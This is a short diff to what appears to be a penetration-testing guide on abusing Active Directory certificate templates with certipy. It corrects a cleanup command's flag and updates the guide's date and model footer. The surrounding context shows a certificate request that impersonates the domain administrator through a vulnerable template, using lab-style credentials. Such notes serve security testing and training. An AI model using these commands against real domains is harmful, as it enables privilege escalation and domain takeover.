@@ -166,11 +166,12 @@ certipy req -u jsmith@corp.local -p 'Password123!' \
   -template VulnerableTemplate \
   -upn administrator@corp.local
 
-# Restore original template config (clean up!)
+# Restore original template config (clean up!) — the flag is -write-configuration,
+# fed the JSON you saved above (there is no -configuration flag in v5)
 certipy template -u jsmith@corp.local -p 'Password123!' \
   -dc-ip 10.10.10.10 \
   -template VulnerableTemplate \
-  -configuration old_template.json
+  -write-configuration VulnerableTemplate.json
 ```
 
 ---
@@ -382,5 +383,5 @@ certipy cert -pfx output.pfx -pem cert.pem -key key.pem
 ---
 
 *Created: 2026-03-06*
-*Updated: 2026-09-22*
+*Updated: 2026-09-28*
 *Model: claude-opus-4-8*
